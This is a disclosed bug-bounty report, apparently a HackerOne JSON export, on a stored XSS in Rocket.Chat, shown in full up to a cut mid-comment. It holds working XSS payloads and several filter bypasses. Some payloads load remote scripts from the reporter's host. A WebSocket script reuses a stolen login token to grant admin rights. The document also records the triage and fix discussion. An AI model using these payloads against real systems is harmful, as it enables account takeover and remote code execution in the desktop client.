{"id":735638,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MzU2Mzg=","url":"https://hackerone.com/reports/735638","title":"Account takeover via XSS","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2019-11-11T20:25:38.352Z","submitted_at":"2019-11-11T20:25:38.352Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"sectex","url":"/sectex","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/CSUnU375phaRJUJwg9DWs52s/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":19858,"url":"https://hackerone.com/rocket_chat","handle":"rocket_chat","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Rocket.Chat","twitter_handle":"RocketChat","website":"https://rocket.chat","about":"Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2021-03-31T08:30:49.240Z","bug_reporter_agreed_on_going_public_at":"2021-03-01T08:30:23.477Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:** By combining AutoLinker and Markdown an attacker is able to inject malicious scripts.\n\n**Description:** By combining AutoLinker and Markdown we can trick the parser into breaking out of the current HTML attribute. \n```\nhttps://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\\x28\\x27XSS\\x27\\x29;'instanceof[] target=_blank data-x=`.`)\n```\nresults in:\n```html\n\u003ca href=\"https://a?p=\u003ca href=\" https:=\"\" style=\"animation-duration:1s;animation-name:blink;animation-iteration-count:2\" onanimationiteration=\"Array.prototype[Symbol.hasInstance]=eval,'alert\\x28\\x27XSS\\x27\\x29;'instanceof[]\" target=\"_blank\" data-x=\"\u003cspan\" class=\"copyonly\"\u003e`\u003cspan\u003e\u003ccode class=\"code-colors inline\"\u003e.\u003c/code\u003e\u003c/span\u003e\u003cspan class=\"copyonly\"\u003e`\u003c/span\u003e\" target=\"_blank\" rel=\"noopener noreferrer\"\u0026gt; \u003c/a\u003e\n\" target=\"_blank\" rel=\"noopener noreferrer\"\u0026gt;https://a?p==!=7vrXTtDtYHrLJ4Z7y=!=\"\n```\n\nTo obtain the login-token of the victim we can either use `document.cookie` or `localStorage.getItem('Meteor.loginToken')`.\nSince we can authenticate against the websocket using this token, we can perform any actions in the context of the victim (change password, email etc.).\n\n## Releases Affected:\n\n  * Rocket.Chat-Desktop-Client: v2.16.2\n  * Rocket.Chat-Server: v2.0.0\n  * Apps-Engine-Version: v1.5.2\n\n## Steps To Reproduce (from initial installation to vulnerability):\n\nIn this example, the role `admin` is assigned to the desired user as far as the victim has the required permissions.\n\nCode (replace `{ATTACKER_USERID}` and `{ATTACKER_EMAIL}`):\n```javascript\n    let ws = new WebSocket(`wss://${window.location.host}/sockjs/111/evilwss/websocket`);\n    ws.onmessage = function (evt) {\n        if (/\\[\"{\\\\\"msg\\\\\":\\\\\"pong\\\\\"}\"\\]/.test(event.data)) {\n            ws.send('[\"{\\\\\"msg\\\\\":\\\\\"pong\\\\\"}\"]');\n        }\n        if (/a\\[\"{\\\\\"server_id\\\\\":\\\\\"(.*)\\\\\"}\"\\]/.test(event.data)) {\n            ws.send('[\"{\\\\\"msg\\\\\":\\\\\"connect\\\\\",\\\\\"version\\\\\":\\\\\"1\\\\\",\\\\\"support\\\\\":[\\\\\"1\\\\\",\\\\\"pre2\\\\\",\\\\\"pre1\\\\\"]}\"]');\n            ws.send(`[\"{\\\\\"msg\\\\\":\\\\\"method\\\\\",\\\\\"method\\\\\":\\\\\"login\\\\\",\\\\\"params\\\\\":[{\\\\\"resume\\\\\":\\\\\"${localStorage.getItem('Meteor.loginToken')}\\\\\"}],\\\\\"id\\\\\":\\\\\"1\\\\\"}\"]`);\n        }\n        if (/a\\[\"{\\\\\"msg\\\\\":\\\\\"connected\\\\\",\\\\\"session\\\\\":\\\\\"(.*)\\\\\"}\"\\]/.test(event.data)) {\n            ws.send('[\"{\\\\\"msg\\\\\":\\\\\"method\\\\\",\\\\\"method\\\\\":\\\\\"insertOrUpdateUser\\\\\",\\\\\"params\\\\\":[{\\\\\"_id\\\\\":\\\\\"{ATTACKER_USERID}\\\\\",\\\\\"statusText\\\\\":\\\\\"\\\\\",\\\\\"email\\\\\":\\\\\"{ATTACKER_EMAIL}\\\\\",\\\\\"verified\\\\\":false,\\\\\"password\\\\\":\\\\\"\\\\\",\\\\\"requirePasswordChange\\\\\":false,\\\\\"joinDefaultChannels\\\\\":false,\\\\\"sendWelcomeEmail\\\\\":false,\\\\\"roles\\\\\":[\\\\\"user\\\\\",\\\\\"admin\\\\\"]}],\\\\\"id\\\\\":\\\\\"17\\\\\"}\"]');\n        }\n    };\n```\nPayload (replace `sectex.dev\\x2ffiles\\x2fcswsh.js`):\n```\nhttps://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'s=document.createElement\\x28\\x27script\\x27\\x29;s.src=\\x27\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2fsectex.dev\\x2ffiles\\x2fcswsh.js\\x27;document.body.appendChild\\x28s\\x29;'instanceof[] target=_blank data-x=`.`)\n```\n\n## Supporting Material/References:\n\n  * {F631806}\n\n## Suggested mitigation\n\n  * Fix initial XSS\n\n## Impact\n\n* Attackers can execute scripts which can lead to:\n    * Account takeover\n    * Abitrary file read in Rocket.Chat-Desktop\n    * RCE in Rocket.Chat-Desktop (#276031)","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":631806,"file_name":"rocketchat.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/KLYbgVfaRHDw93HK4zu42ZZW?response-content-disposition=attachment%3B%20filename%3D%22rocketchat.mp4%22%3B%20filename%2A%3DUTF-8%27%27rocketchat.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXEQ3VCGF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152147Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCNbr25hK1JC2i73IX5uE08m1agZwA%2BCyxTPtXmxpZHFAIgA9v21iU9rOtKWjxfMHo7kqQOL4Y8ABbAnucRVLpaC9cqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDOyim%2FBwzSkIWBPCWirXA1TUfPlTIAz6iDfoaiiMP8hivTDD8uDyRJ%2FoAF5UW%2F6cSrWHj2Mtt%2Fx8tKTYSGoQiyhUdi%2BFdxLY35ZRGqE5k10GcpBa5q9ivBUHzTLtIbzvkVLjo0GDs33RjPyv8lT8%2BIT3cR1GpHz5sKugzk1wJHpaXHIGV7TsNZTez5PsxRWLAbodD46%2Bv0aY9dXICvo8Bld1OIiDoUsI3sX2R7SAEjL0B45opfmY7Hh4KKVF9KyCf7etmcGEL0U%2Bjij5TfmuHRxoVJXFKR4WbBKoHXN3cL5AQhAkGBE5bmE6cTsvfhMkCltMfmR1OmQtt1QK7fs2YWSyJhNNnjgzseVzroJk8qcktNvGQQNtmAz%2F0hi%2BbLDdR3r35MBTZtRPxGxwfYKfk%2Blyikhar%2F%2FfPxr6sJoQhbcKSjiziR8cFwFPC97f3qfgH6sVJVvH5AClhLDj9FMqequ01uI1FMQI%2BQ1BJ1t%2Bl3dX7D09OZCMRrk3HvidiN7al4fmx5e0pKMz7tbb23gSzvgiMJbXeHgATiARA8dz6JIoLosFubesB7ZLWq9owsMVaP42CuihB%2Br9J9vu1HkgY4lcWvgRt8bqCjXjWDPBzlNcnc9D32bMJUDfp2BWdJ0BCnpEi4XjrDCyiJGLBjqlAbw%2BQzzkBo5pgpwg2B9K3Kb9khz80zQhxWTR4UFlyZpApeXe135MxtRrVWf1VeEC8qBZynSiicNEE5qSEPmd%2FKNSihzfYJ9PmbUkfZN9yFsrIArapjiCpWMywbnOVNeLSHMFFv8xtfh0sOTI4VetTtHS5BxyHny%2BvnXM6Hjudg5tfOAvbwkv9j%2BTfq0Y0YGFWvyUNrCeX3Y3zQ5t8ked%2FqOvxUSYeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=fa1de9a4b90badd3ac1678c295f68069ad3c17ebd2e3282e6957982b8fad3b64","file_size":1645988,"type":"video/mp4"}],"allow_singular_disclosure_at":"2021-03-31T08:30:23.596Z","allow_singular_disclosure_after":-16786283.830347117,"singular_disclosure_allowed":true,"vote_count":35,"voters":["fabianfreyer","pretorian","battle_angel","fqdn","th4nu_0x0","1337fenrir","ms-13","grisboublik","the_boschko","cheatdroit1","and 25 more..."],"severity":{"rating":"critical","score":9.0,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"required","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":6287622,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2019-11-12T12:46:34.629Z","updated_at":"2019-11-12T12:46:34.629Z","additional_data":{"old_severity":null,"new_severity":"Critical (9.0)","old_severity_id":null,"new_severity_id":563878},"actor":{"username":"sectex","cleared":false,"url":"/sectex","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CSUnU375phaRJUJwg9DWs52s/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6287625,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Followed the CVSS Calculator\n\n| Metric              | Value    | Comments                                                            |\n| ------------------- |:--------:| -------------------------------------------------------------------:|\n| Attack Vector       | Network  | \tA victim/attacker must access a vulnerable system via the network. |\n| Attack Complexity   | Low      | |\n| Privileges Required | Low      |  An attacker must possess some user level privileges to store the malicious scripts. |\n| User Interaction    | Required |  The victim needs to navigate to a web page on the vulnerable server that contains malicious scripts injected by the attacker. |\n| Scope               | Changed  |  The vulnerability is in the web server, but the malicious scripts execute in the victim’s browser on their machine. |\n| Confidentiality     | High     |  In the worst case, an attacker can create privileged users or perform RCE in Rocket.Chat-Desktop. |\n| Integrity           | High     |  In the worst case, an attacker can create privileged users or perform RCE in Rocket.Chat-Desktop. |\n| Availability        | High     |  In the worst case, an attacker can deface, or otherwise disrupt service for all users. |","automated_response":false,"created_at":"2019-11-12T12:47:12.640Z","updated_at":"2019-11-12T12:47:12.640Z","actor":{"username":"sectex","cleared":false,"url":"/sectex","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CSUnU375phaRJUJwg9DWs52s/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6288732,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for your report! We need some more information before we can adequately review this report. Is it possible you could provide a clear step-by-step PoC showing your vulnerability?  Thanks again for your report and we hope to hear back from you soon.\n\nKind regards.","automated_response":false,"created_at":"2019-11-12T14:02:05.952Z","updated_at":"2019-11-12T14:02:05.952Z","actor":{"username":"orangeband","cleared":false,"url":"/orangeband","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/390/540/b55c564a8a6f8099d28ea9afa41d197ad0031fc3_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6290244,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Of course:\n\n* Create an attacker-account and assign the role `user` to it.\n* Create an admin-account (or use existing admin-account)\n* Login using the attacker-account.\n* Open developer-tools and type `document.cookie`.\n* Copy the value of `rc_uid`.\n* Send the following message to the admin.\n   Replace `{ATTACKER_USER_ID}` with the value of `rc_uid`.\n\n   ```\n   https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'s=document.createElement\\x28\\x27script\\x27\\x29;s.src=\\x27\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2fsectex.dev\\x2fPoC?user={ATTACKER_USER_ID}\\x27;document.body.appendChild\\x28s\\x29;'instanceof[] target=_blank data-x=`.`)\n   ```\n* Logout and Login using the admin-account\n* Read the message.\n* Go to `Administration » Users`\n* Observe that the role `admin` was assigned to the attacker-account\n\nHope this will help. \n\nCould you please also check the severity of this vulnerability?\n\nMany thanks in advance!","automated_response":false,"created_at":"2019-11-12T17:31:26.569Z","updated_at":"2019-11-12T17:37:21.672Z","actor":{"username":"sectex","cleared":false,"url":"/sectex","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CSUnU375phaRJUJwg9DWs52s/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6290954,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Additionally here is a PoC for... \n* RCE vulnerability in Rocket.Chat-Desktop (reported in #276031).\n```\nhttps://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'s=document.createElement\\x28\\x27script\\x27\\x29;s.src=\\x27\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2fsectex.dev\\x2ffiles\\x2frce.js\\x27;document.body.appendChild\\x28s\\x29;'instanceof[] target=_blank data-x=`.`)\n```\n\n* Abitrary file read vulnerability in Rocket.Chat-Desktop:\n```\nhttps://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'s=document.createElement\\x28\\x27script\\x27\\x29;s.src=\\x27\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2fsectex.dev\\x2ffiles\\x2fafr.js\\x27;document.body.appendChild\\x28s\\x29;'instanceof[] target=_blank data-x=`.`)\n```","automated_response":false,"created_at":"2019-11-12T18:46:25.241Z","updated_at":"2019-11-12T18:50:54.154Z","actor":{"username":"sectex","cleared":false,"url":"/sectex","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CSUnU375phaRJUJwg9DWs52s/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6293296,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @sectex\n\nthank you for reporting this. We will definitely look for a fix for this one.\n\nDo I see this right as being limited to the Desktop client? I did a quick test and in the web application I could not reproduce this there.\n\nIt would be great if you could expand a bit on your mitigation suggestions. What do you think should be the most important steps to prevent the XSS for this one?\n\nAbout the severity: I will leave this for now as is, it seems critical.\n\nBest\nMarkus","automated_response":false,"created_at":"2019-11-13T00:40:48.624Z","updated_at":"2019-11-13T00:40:48.624Z","actor":{"username":"markus-rocketchat","cleared":false,"url":"/markus-rocketchat","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6293306,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"About your last comment: Are you stating that https://hackerone.com/reports/276031 was not fixed and is still unresolved? Or rather that you used your exploit to get to the same result as in that report?","automated_response":false,"created_at":"2019-11-13T00:42:24.309Z","updated_at":"2019-11-13T00:42:24.309Z","actor":{"username":"markus-rocketchat","cleared":false,"url":"/markus-rocketchat","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6296923,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @markus-rocketchat \n\nSorry, there was a typo in the script...\nI've fixed that and tested it using\n    * Chrome (v78.0.3904.97)\n    * Firefox (v70.0.1)\n    * Edge (v44.17763.771.0)\n\nUnfortunately I do not know how to fix this vulnerability. I can only guess what happens here:\n1. Original message: \n   ```\n   https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 \n   onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\\x28\\x27XSS\\x27\\x29;'instanceof[] \n   target=_blank data-x=`.`)\n   ```\n\n2. After parsing `inline-code`: \n   ```html   \n   https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 \n   onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\\x28\\x27XSS\\x27\\x29;'instanceof[] \n   target=_blank data-x=\u003cspan class=\"copyonly\"\u003e`\u003c/span\u003e\u003cspan\u003e\u003ccode class=\"code-colors inline\"\u003e.\u003c/code\u003e\u003c/span\u003e\u003cspan class=\"copyonly\"\u003e`\u003c/span\u003e)\n   ```\n\n3. After parsing `markdown-url`:\n   ```html   \n   https://a?p=\u003ca href=\"https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 \n   onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\\x28\\x27XSS\\x27\\x29;'instanceof[] \n   target=_blank data-x=\u003cspan class=\"copyonly\"\u003e`\u003c/span\u003e\u003cspan\u003e\u003ccode class=\"code-colors inline\"\u003e.\u003c/code\u003e\u003c/span\u003e\u003cspan class=\"copyonly\"\u003e`\u003c/span\u003e \" \n   target=\"_blank\" rel=\"noopener noreferrer\"\u003e \u003c/a\u003e\n   ```\n\n4. After parsing `autolinker-url`:\n   ```html\n   \u003ca href=\"\u003ca href=\"https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 \n   onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\\x28\\x27XSS\\x27\\x29;'instanceof[] \n   target=_blank data-x=\u003cspan class=\"copyonly\"\u003e`\u003c/span\u003e\u003cspan\u003e\u003ccode class=\"code-colors inline\"\u003e.\u003c/code\u003e\u003c/span\u003e\u003cspan class=\"copyonly\"\u003e`\u003c/span\u003e \" \n   target=\"_blank\" rel=\"noopener noreferrer\"\u003e \u003c/a\u003e\" target=\"_blank\" rel=\"noopener noreferrer\"\u003e\" target=\"_blank\" rel=\"noopener noreferrer\"\u0026gt;https://a?p==!=bqBSX4RMwXa349QaE=!=\u003c/a\u003e\n   ```\n\nI'm not sure, but I think url-encoding the values provided to the autolinker should fix it, since this would lead to:\n```html\n\u003ca href=\"%3Ca%20href%3D%22https%3A%2F%2F%20style%3Danimation-duration%3A1s%3Banimation-name%3Ablink%3Banimation-iteration-count%3A2%20onanimationiteration%3DArray.prototype%5BSymbol.hasInstance%5D%3Deval%2C%27alert%5Cx28%5Cx27XSS%5Cx27%5Cx29%3B%27instanceof%5B%5D%20target%3D_blank%20data-x%3D%3Cspan%20class%3D%22copyonly%22%3E%60%3C%2Fspan%3E%3Cspan%3E%3Ccode%20class%3D%22code-colors%20inline%22%3E.%3C%2Fcode%3E%3C%2Fspan%3E%3Cspan%20class%3D%22copyonly%22%3E%60%3C%2Fspan%3E%20%22%20target%3D%22_blank%22%20rel%3D%22noopener%20noreferrer%22%3E%20%3C%2Fa%3E\"\u003elink-text\u003c/a\u003e\n```\n\n\nRegarding report #276031: I can confirm that the initial XSS from this report was fixed. \nI only used my exploit to get to the same result as in that report. ","automated_response":false,"created_at":"2019-11-13T12:32:26.341Z","updated_at":"2019-11-13T12:32:26.341Z","actor":{"username":"sectex","cleared":false,"url":"/sectex","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CSUnU375phaRJUJwg9DWs52s/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6297121,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@sectex  thank you for your reply. We are looking into this right now.","automated_response":false,"created_at":"2019-11-13T13:04:31.982Z","updated_at":"2019-11-13T13:04:31.982Z","actor":{"username":"markus-rocketchat","cleared":false,"url":"/markus-rocketchat","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6430616,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @sectex \n\nthanks again for reporting this one!!!\nWe have in the meantime worked on a fix that has been merged already.\nhttps://github.com/RocketChat/Rocket.Chat/pull/15794\n\nThank you for making Rocket.Chat more secure for millions of users!\n\nBest\nMarkus","automated_response":false,"created_at":"2019-11-29T03:49:34.042Z","updated_at":"2019-11-29T03:49:34.042Z","actor":{"username":"markus-rocketchat","cleared":false,"url":"/markus-rocketchat","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"sectex","url":"/sectex"},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6432176,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @markus-rocketchat,\n\nNice to hear that, I will have a look at it after work. \nI would like to accept the offer from the feedback. If you need more information on my part, please let me know. \nE-Mail: maik-stegemann@protonmail.com\n\nBest\nsectex","automated_response":false,"created_at":"2019-11-29T09:30:04.902Z","updated_at":"2019-11-29T09:30:04.902Z","actor":{"username":"sectex","cleared":false,"url":"/sectex","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CSUnU375phaRJUJwg9DWs52s/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6504772,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @markus-rocketchat,\n\nUnfortunately I can not confirm that the issue is fixed.\nIf I understand correctly the fix relies in the assumption that `new URL(url);` will throw an exception when unintended values are provided ([Commit 15794](https://github.com/RocketChat/Rocket.Chat/pull/15794/commits/d1be45c447a5e3e8dde0327b8c8d7d76cee50e44)).\nThe initial payload doesn't work anymore, but with some adjustments I'm still able to execute abitrary javascript.\n\n* `alert`-PoC #1\n\n    ```\n    https://a?p=[ ](https://a.de? style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration='alert\\x280\\x29'instanceof{[Symbol.hasInstance]:eval}`.`)\n    ```\n* `alert`-PoC #2\n    ```\n    https://a?p=[ ](https://a.de? style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\\x280\\x29'instanceof[]`.`)\n    ```\n* Account-Takeover-PoC #1 (replace `{ATTACKER_USER_ID}`):\n    ```\n    https://a?p=[ ](https://a.de? style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration='s=document.createElement\\x28\\x27script\\x27\\x29;s.src=\\x27\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2fsectex.dev\\x2fPoC?user={ATTACKER_USER_ID}\u0026https=true\\x27;document.body.appendChild\\x28s\\x29;'instanceof{[Symbol.hasInstance]:eval}`.`)\n    ```\n* Account-Takeover-Poc #2 (replace `{ATTACKER_USER_ID}`):\n    ```\n    https://a?p=[ ](https://a.de? style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'s=document.createElement\\x28\\x27script\\x27\\x29;s.src=\\x27\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2fsectex.dev\\x2fPoC?user={ATTACKER_USER_ID}\u0026https=true\\x27;document.body.appendChild\\x28s\\x29;'instanceof[]`.`)\n    ```\n* RCE in Rocket.Chat-Desktop PoC:\n    ```\n    https://a?p=[ ](https://a.de? style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'s=document.createElement\\x28\\x27script\\x27\\x29;s.src=\\x27\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2fsectex.dev\\x2ffiles\\x2frce.js\\x27;document.body.appendChild\\x28s\\x29;'instanceof[] target=_blank data-x=`.`)\n    ```\n\n# Releases:\n* Rocket.Chat-Server: v3.0.0-develop\n* Apps-Engine-Version: v1.11.0\n* Rocket.Chat-Desktop: v2.17.0","automated_response":false,"created_at":"2019-12-09T16:37:23.760Z","updated_at":"2019-12-09T16:37:23.760Z","actor":{"username":"sectex","cleared":false,"url":"/sectex","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CSUnU375phaRJUJwg9DWs52s/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6504825,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"Thanks @sectex . I will reopen this one","automated_response":false,"created_at":"2019-12-09T16:43:24.408Z","updated_at":"2019-12-09T16:43:24.408Z","actor":{"username":"markus-rocketchat","cleared":false,"url":"/markus-rocketchat","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6553372,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"triage it with same values","automated_response":false,"created_at":"2019-12-15T22:23:53.594Z","updated_at":"2019-12-15T22:23:53.594Z","actor":{"username":"markus-rocketchat","cleared":false,"url":"/markus-rocketchat","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8618654,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @markus-rocketchat,\nAny news on this one? \nI've noticed that the payloads don't work anymore because the parser no longer allows spaces (v3.4.2). \nThe [release notes of v3.4.0](https://github.com/RocketChat/Rocket.Chat/pull/18078) indicate that the regex to match URL has been changed.\nThe vulnerability still appears to be exploitable. However, the victim now must click the message.\nNew PoC:\n```\nhttps://a?p=[ ](https://a.de?/onclick='alert\\x28\\x27XSS\\x27\\x29'instanceof{[Symbol.hasInstance]:eval}`.`)\n```","automated_response":false,"created_at":"2020-07-16T13:00:44.041Z","updated_at":"2020-07-16T13:00:44.041Z","actor":{"username":"sectex","cleared":false,"url":"/sectex","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CSUnU375phaRJUJwg9DWs52s/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rocket_chat","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8773877,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @sectex \n\nyes, we have recently made some changes to prevent attacks like this. Let me check if we can remove the clickable vulnerability as well. Thanks for your 